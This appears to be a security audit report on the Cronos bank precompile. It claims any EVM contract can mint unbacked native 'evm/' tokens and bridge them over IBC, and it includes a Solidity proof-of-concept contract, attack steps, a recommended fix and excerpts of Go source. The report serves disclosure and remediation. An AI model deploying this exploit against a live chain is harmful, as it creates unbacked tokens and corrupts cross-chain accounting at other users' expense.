### Title
Unauthorized Native Token Mint via Bank Precompile Without ERC20 Burn Enforcement — (`x/cronos/keeper/precompiles/bank.go`)

### Summary

The bank precompile's `mint` function allows **any** EVM contract to mint native Cosmos bank-module tokens with denom `evm/{callerAddress}` without any check that the caller has burned equivalent ERC20 tokens first. The intended accounting invariant — that `evm/{contractAddress}` native supply equals burned ERC20 supply — is never enforced. An unprivileged attacker deploys a malicious contract, calls `bank.mint` directly, receives unbacked native tokens, and can bridge them via IBC to another chain.

---

### Finding Description

**Intended flow** (shown in `TestBank.sol`):

```solidity
function moveToNative(uint256 amount) public returns (bool) {
    _burn(msg.sender, amount);        // 1. burn ERC20
    return bank.mint(msg.sender, amount); // 2. mint native
}
```

The design assumes a contract will always burn its ERC20 tokens before calling `bank.mint`, maintaining a 1:1 backing invariant.

**Actual enforcement in the precompile** (`x/cronos/keeper/precompiles/bank.go`, `Run`):

```go
case MintMethodName, BurnMethodName:
    ...
    denom := EVMDenom(contract.Caller())   // "evm/" + callerAddress.Hex()
    amt := sdk.NewCoin(denom, ...)
    err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
        if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil { return err }
        if method.Name == "mint" {
            bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt))
            bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, ...)
        }
        ...
    })
```

The only guards are:
- `readonly` flag
- `amount > 0`
- recipient not in blocklist
- `IsSendEnabledCoins` (true by default for any new denom)

**There is no check that:**
1. The caller is a registered/mapped contract
2. The caller has burned equivalent ERC20 tokens
3. The caller is authorized to mint tokens at all

`EVMDenom` simply returns `"evm/" + token.Hex()` — a valid SDK coin denom that is send-enabled by default and accepted by the standard IBC transfer module.

The `transfer` method has the same gap: it accepts an arbitrary `sender` address argument and moves `evm/{callerAddress}` tokens from that address without the sender's approval, enabling a secondary drain of any `evm/` tokens previously minted to victims.

---

### Impact Explanation

**Critical — Unauthorized mint of native tokens bridgeable via IBC.**

An attacker mints `evm/0x{maliciousContract}` native tokens out of thin air. These are real `x/bank` module coins. The attacker can:

1. Hold them on Cronos (inflating supply of a denom with no backing).
2. Submit a standard `MsgTransfer` (IBC transfer) to send them to another chain. The IBC module escrows the tokens on Cronos and mints vouchers on the destination chain — vouchers backed by nothing. This directly corrupts IBC channel accounting.

The `evm/` namespace is distinct from `cronos0x`, `ibc/`, and `gravity0x`, so the minted tokens do not directly impersonate a registered CRC20 token. However, the unauthorized creation of native tokens that can traverse IBC is a Critical accounting/bridge impact under the allowed scope.

---

### Likelihood Explanation

**High.** Any unprivileged user can:
- Deploy an EVM contract (permissionless on Cronos)
- Call the bank precompile at `0x0000000000000000000000000000000000000064` from that contract
- No admin key, governance vote, or special permission is required

The precompile is publicly documented and its ABI is published.

---

### Recommendation

Add an authorization check in `BankContract.Run` for `MintMethodName` that verifies the caller (`contract.Caller()`) has actually burned the equivalent amount of its own ERC20 tokens within the same transaction, **or** restrict `mint` calls to contracts that have been explicitly registered in the cronos keeper's token mapping. A minimal fix:

```go
// In the mint branch, verify caller is a registered contract
if _, found := cronosKeeper.GetDenomByContract(ctx, contract.Caller()); !found {
    return errors.New("caller is not a registered token contract")
}
```

Alternatively, remove the ability for arbitrary contracts to call `bank.mint` and require the conversion to go through `ConvertCoinFromCRC21ToNative`, which already enforces the burn-before-mint invariant.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
}

contract MaliciousMinter {
    address constant bankPrecompile = 0x0000000000000000000000000000000000000064;
    IBankModule bank = IBankModule(bankPrecompile);

    // Call this to mint unbacked native tokens with denom "evm/0x{address(this)}"
    // No ERC20 tokens are burned. No authorization is checked.
    function exploit(address recipient, uint256 amount) external {
        bank.mint(recipient, amount);
        // recipient now holds `amount` of native "evm/0x{address(this)}" tokens
        // with zero backing, which can be sent via MsgTransfer over IBC
    }
}
```

**Steps:**
1. Deploy `MaliciousMinter` on Cronos — anyone can do this.
2. Call `exploit(attacker, 1_000_000e18)`.
3. Attacker's Cosmos address now holds `1_000_000e18` of `evm/0x{MaliciousMinter}` native tokens.
4. Attacker submits `MsgTransfer` to bridge these tokens to a destination chain via IBC.
5. Destination chain receives IBC vouchers backed by nothing on Cronos.

func (bc *BankContract) Run(evm *vm.EVM, contract *vm.Contract, readonly bool) ([]byte, error) {
	// parse input
	methodID := contract.Input[:4]
	method, err := bankABI.MethodById(methodID)
	if err != nil {
		return nil, err
	}
	stateDB := evm.StateDB.(ExtStateDB)
	precompileAddr := bc.Address()
	switch method.Name {
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)

// ConvertCoinFromNativeToCRC21 convert native token to erc20 token
func (k Keeper) ConvertCoinFromNativeToCRC21(ctx sdk.Context, sender common.Address, coin sdk.Coin, autoDeploy bool) error {
	if !types.IsValidCoinDenom(coin.Denom) {
		return fmt.Errorf("coin %s is not supported for conversion", coin.Denom)
	}
	var err error
	// external contract is returned in preference to auto-deployed ones
	contract, found := k.GetContractByDenom(ctx, coin.Denom)
	if !found {
		if !autoDeploy {
			return fmt.Errorf("no contract found for the denom %s", coin.Denom)
		}
		contract, err = k.DeployModuleCRC21(ctx, coin.Denom)
		if err != nil {
			return err
		}
		if err = k.SetAutoContractForDenom(ctx, coin.Denom, contract); err != nil {
			return err
		}

		k.Logger(ctx).Info(fmt.Sprintf("contract address %s created for coin denom %s", contract.String(), coin.Denom))
	}

	isSource := types.IsSourceCoin(coin.Denom)
	coins := sdk.NewCoins(coin)
	if isSource {
		// burn coins
		err = k.bankKeeper.SendCoinsFromAccountToModule(ctx, sdk.AccAddress(sender.Bytes()), types.ModuleName, sdk.NewCoins(coin))
		if err != nil {
			return err
		}
		err = k.bankKeeper.BurnCoins(ctx, types.ModuleName, coins)
		if err != nil {
			return err
		}
		// unlock crc tokens
		_, err = k.CallModuleCRC21(ctx, contract, "transfer_from_cronos_module", sender, coin.Amount.BigInt())
		if err != nil {
			return err
		}
	} else {
		// send coins to contract address
		err = k.bankKeeper.SendCoins(ctx, sdk.AccAddress(sender.Bytes()), sdk.AccAddress(contract.Bytes()), coins)
		if err != nil {
			return err
		}
		// mint crc tokens
		_, err = k.CallModuleCRC21(ctx, contract, "mint_by_cronos_module", sender, coin.Amount.BigInt())
		if err != nil {
			return err
		}
	}

	return nil
}

func (k Keeper) ibcSendTransfer(ctx sdk.Context, sender sdk.AccAddress, destination string, coin sdk.Coin, channelId string) error {
	if types.IsSourceCoin(coin.Denom) {
		if !channeltypes.IsValidChannelID(channelId) {
			return errors.New("invalid channel id for ibc transfer of source token")
		}
	} else {
		// If it is not source, then coin is a voucher so we can extract the channel id from the denom
		channelDenom := coin.Denom
		sourceChannelID, err := k.GetSourceChannelID(ctx, channelDenom)
		if err != nil {
			return err
		}
		channelId = sourceChannelID
	}

	// Transfer coins to receiver through IBC
	// We use current time for timeout timestamp and zero height for timeoutHeight
	// it means it can never fail by timeout
	params := k.GetParams(ctx)
	timeoutTimestamp := uint64(ctx.BlockTime().UnixNano()) + params.IbcTimeout
	timeoutHeight := ibcclienttypes.ZeroHeight()
	msg := ibctransfertypes.MsgTransfer{
		SourcePort:       ibctransfertypes.PortID,
		SourceChannel:    channelId,
		Token:            coin,
		Sender:           sender.String(),
		Receiver:         destination,
		TimeoutHeight:    timeoutHeight,
		TimeoutTimestamp: timeoutTimestamp,
	}
	if _, err := k.transferKeeper.Transfer(ctx, &msg); err != nil {
		return err
	}
	return nil
